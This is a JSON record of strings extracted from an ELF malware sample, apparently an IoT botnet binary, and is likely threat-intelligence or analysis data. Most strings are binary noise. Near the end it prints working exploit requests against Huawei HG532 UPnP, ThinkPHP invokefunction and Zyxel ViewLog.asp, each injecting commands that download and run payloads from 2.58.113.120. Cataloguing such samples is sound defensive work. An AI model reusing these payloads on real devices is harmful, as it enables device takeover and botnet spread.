{
    "malware_data": [
        {
            "filename": "12665ab1558479db12aea7281f21cb2ce26b2fc7444364ae5f6f37e2d4833e50.elf",
            "filetype": "7F454C46",
            "filesize": "71KB",
            "hash_sha256": "12665ab1558479db12aea7281f21cb2ce26b2fc7444364ae5f6f37e2d4833e50",
            "strings": [
                "ff/F/",
                "Lds`",
                "lfSa",
                "s#e@3",
                "/sm\"O,",
                "w`;!",
                "qx'g",
                " !3b",
                "r ask",
                "s3kD",
                "qsj !<",
                "Lds`La",
                "a`12",
                "s#e04",
                "RdH$",
                ",b#a",
                "/\"OZ",
                "=b4r-a",
                "-b,j|a",
                "ya)s8",
                "d$Q u@",
                "v4wa",
                "a{\"=",
                "@;\"<",
                "P)'#a)#",
                "AmB{!+#;!",
                "/Sn\"O}",
                "Q\"`#c",
                "a{\"M",
                "@;\"K",
                " #e@",
                "u0'#c",
                "/\"Og",
                "AmH|g;\"'",
                "\"}@$",
                "2)'#a)#)A",
                "c^|c,a",
                "ahP\\b",
                "tP'(x",
                ")q (",
                "F*xK",
                "a{\"A",
                "@;\"@",
                ")'#a)#",
                "^]cla\\",
                "APe|l3j",
                "F*xM",
                "(,qp!",
                ",dQ@",
                ".xQlj",
                "+-qP",
                "Ti @",
                "(}DL",
                "d\"qzU",
                "(wr/",
                "a{\";",
                "@;\":",
                "/\"O^",
                "7qg4",
                "}b`fBr-a",
                "Qlf5",
                "&-af",
                "S-b,k",
                "W/v[",
                " (w$Q.u",
                "`) @",
                "2$R&",
                "sBv1",
                "Bluu",
                "Chuq",
                "Gdun",
                "a{\"?",
                "@;\"=",
                "7rPrQ",
                "/\"O{",
                "qb`cb",
                " ch@",
                "tpgc`",
                "\"ca!# ",
                " !cb",
                "-b|1",
                "h{\"&",
                "@;\"%",
                "@sd@",
                "m}g9",
                "M=b$",
                "/r-a",
                "'<ar",
                "#nla,b",
                "B`Cc",
                "`\"1!Cc",
                ",8q$",
                "Amfd",
                "r'7&",
                "|?&O",
                "JR**",
                "|33a",
                "k#-@",
                "62/a",
                "6\"QnS",
                "R#ay!p1",
                ")'#a)#)A",
                "Q{#+#y",
                "9\"3a",
                "c,ai ",
                "c#g#a",
                "*\"aqc",
                "x1(\"Q",
                "#)!r",
                "W)!o",
                "2*Uk!g",
                "d)!d",
                "`)!a",
                "Q(ve",
                "s#3?",
                "7zPz](p",
                "@ ~@",
                "-a@a",
                "2-a#`)@",
                "/s`miCWDX",
                "t@bsa9'",
                "`)A|1)@,b9(",
                "3b) ",
                "/\"OB`",
                "qV2q!",
                "sf\\1",
                "P2c003",
                "D}A;$",
                "\"+$D",
                "G1\"<",
                "A1\"3",
                "AcrdK",
                "VUUU",
                "DRra",
                "3a9'CV9\"",
                "A;\"3",
                "{!+!3",
                "GMA;'",
                "\"+'`7",
                "3d2Q",
                ",3Ca",
                "qQ! ",
                "sa-A",
                "C;\"\"!",
                "C)#8#b",
                "<1rb",
                "!+(+",
                "x'4\"",
                "`0a|",
                "`0a\\",
                "/\"OF",
                "JseZ",
                "J3eZ",
                "7|2\"a",
                "d<2\"a",
                "(33a",
                "dH$^",
                "#a}A",
                "\"Bc#`ra",
                "&Ra2%",
                "Gz#:\"* ",
                "a3g-G",
                "f*!2-z#",
                "Az\"j!#c",
                "C*#2$",
                "ech3fsb",
                "ccsb",
                "\"ca:!#c",
                "C*#1$",
                "b+2!",
                "Cb+z\":&#aj\"R*",
                "/\"OAP",
                "/\"O;",
                "P,1&",
                "g3amA|1Qf",
                "ql22,!!!%",
                "R`Sb",
                "!3Q6",
                "HCe1",
                "HCe'",
                "HCe#",
                "HCe&",
                "c`3`1",
                ".[#Ca",
                "b<c7",
                ")BmA",
                "#{\";\"$",
                "!B!B",
                "$Q#d'",
                "A3e#",
                "4RQc",
                "gfff",
                "Hlf\"",
                "3a9'",
                "V9\")A",
                "A;\"@",
                "{!+!?",
                "G]A;'",
                "s@3\"",
                "SbSQ",
                "l5#a",
                "!#d+",
                "a(1f1Y",
                "csamA",
                "U3a-A",
                "A3`\\139",
                "G{\"\"!",
                "V2a,6f",
                "hc<:",
                "r&3!",
                "rl1&1",
                "6R/3d",
                "B3eZ",
                "r!a#e",
                "Sb)BSa",
                "ASc)C",
                "h.d^cba|1",
                "b:\" !ba|1",
                "\" !ba|1",
                "wJ\" !",
                "As`<1",
                "7;\"\"!",
                "saMA",
                "r#`\\",
                "/\"Ota",
                "4lb#a",
                "r,aV11",
                "ca81",
                "r#`L",
                "S`#q",
                " !Cc",
                "b|2 a",
                "CcKc8#",
                "!CQ ",
                "NMA;.",
                "\"+.@",
                "4R3d",
                "C!!6",
                "21\"/",
                "A;\"5",
                "{!+!5",
                "Cc,3Sf",
                "C)#8#a",
                "!+*;",
                "!+*+",
                "%ZE-",
                "q)!h",
                "(w2\"$qq",
                "wraSc",
                "@~3`",
                " 3`@~",
                "q\"f3`",
                " @~3`",
                "/3`\"O",
                "wra6",
                "/Sh\"O",
                "3e3a u",
                "a,q3b2",
                "0R!S",
                "emf3`",
                "/\"O+",
                "/Ci\"O",
                "28#!",
                "uCb^",
                "sc&0(C",
                "sc&0",
                "c`K [ h&",
                "C`l0",
                "H5g1",
                "Scg1",
                "uCg^",
                "w(&Sc",
                "#Cb00",
                "qQSRVSWTXUYVZW[",
                "(!Sc",
                "v0f ",
                "qVcVf(@Vg= Vhm#Vi}&Vj",
                "#`K`cm",
                "&6DT",
                "v3a;",
                "v3a(",
                "vra2\"qS",
                "vwSh&",
                " r2\"T",
                "c {!",
                "zcd&",
                "u#dc`",
                "bCa-GSP",
                "6Sil4",
                "#`C`",
                "*:JZ",
                "rCa!W",
                "rCa\"V",
                "rCa#W",
                "rCa$V",
                "rCa%W",
                "rCa&V",
                "r'WCa",
                "cCa(V",
                "s'Wg",
                "s\"f8#r!",
                "\"Cc {",
                "j\"UCc!X",
                "j#WCc\"U",
                "rCc$V#W",
                "j%XCc$V",
                "Fca{!",
                "ncg/",
                "Cb\\fca",
                "ca2\"1",
                "C`X0",
                "nCbTa",
                "nB.Q",
                "/\"OD",
                "'b)!",
                "h)('",
                "/ScG",
                "/\"OT",
                "#a,q",
                "3b\"$",
                "3b(1",
                " 80\"%",
                "n\"c81",
                "!Wx'",
                "\"Q!R",
                "c!R(\"",
                "/h&b",
                "x'R$x'",
                "\"OBh",
                "l98#",
                "e2a2V",
                "sarb(1",
                ",93fsesh",
                "/\"O_",
                "A|11",
                "p\"OSS",
                "nRR8##f",
                "eQQ(1!A!A",
                "2<2/",
                "!C'9",
                "A<1#c",
                "A8#,13",
                "Race",
                "#cL33d",
                "BcAR2a3f&g",
                "vFU|1",
                "/\"OSR",
                "nH$RW",
                "(\"B'2",
                "4G:*2",
                "4B#S6",
                "|2\")",
                "1!A!A",
                "8\"O!H",
                "/l5\"O",
                "pScS",
                "2(\"!ba",
                "CmR(O",
                "Sb&a",
                "c@s7P",
                "=R;Q 1",
                "!H\"!",
                "da)mf0a",
                "/\"Ol",
                "#<7&7",
                "/Sf\"O",
                "b0Q r",
                "(-b2Qq",
                "Q-b\"(]e",
                "1a-b",
                "t@b#`",
                "(\"#`.",
                "sc-Cy!sb",
                "G)B|g",
                "\"{#;\"\"*",
                "/Ck\"O;",
                "R|q3",
                "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1",
                "Content-Length: 430",
                "Connection: keep-alive",
                "Accept: */*",
                "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"",
                "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 2.58.113.120 -l /tmp/binary -r /mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary mips)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",
                "2.58.113.120",
                "<!: acam",
                " 18:1 ",
                "0125!8 ",
                "$5''#;&0",
                "509=:",
                "\"=.,\"",
                "'!$$;& ",
                "?;d509=:",
                "efg`a",
                "!'1&",
                ",<8#",
                "&;; ",
                ":217 10t",
                "!8 T",
                "'<188T",
                "1:5681T",
                "'-' 19T",
                "{6=:{6!'-6;,t",
                "nt5$$81 t:; t2;!:0T",
                ":7;&&17 T",
                "{6=:{6!'-6;,t$'T",
                "{6=:{6!'-6;,t?=88tymtT",
                "{$&;7{T",
                "{1,1T",
                "{20T",
                "{95$'T",
                "{$&;7{:1 { 7$T",
                "{' 5 !'T",
                "z5:=91T",
                "{$&;7{:1 {&;! 1T",
                "5''#;&0T",
                "{1 7{&1';8\"z7;:2T",
                ":591'1&\"1&tT",
                "{01\"{#5 7<0;3T",
                "{01\"{9='7{#5 7<0;3T",
                "$662*7!E",
                ";3=:T",
                "1: 1&T",
                "e365`70;9ag:<$ef1=d?2>T",
                ";!&71t",
                ":3=:1t",
                "!1&-T",
                "GET /index.php?s=/index/",
                "hink",
                "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1",
                "Accept-Encoding: gzip, deflate",
                "Accept: /",
                "User-Agent: Uirusu/2.0",
                "POST /cgi-bin/ViewLog.asp HTTP/1.1",
                "Host: 192.168.0.14:80",
                "User-Agent: python-requests/2.20.0",
                "Content-Length: 227",
                "Content-Type: application/x-www-form-urlencoded",
                " /bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh",
                "/dev/null",
                "CAk[S",
                ".shstrtab",
                ".init",
                ".text",
                ".fini",
                ".rodata",
                ".ctors",
                ".dtors",
                ".data",
                ".bss",
                "@^APAPA",
                "^APAPA",
                "BPAPA",
                "^APA"
            ]
        }
    ]
}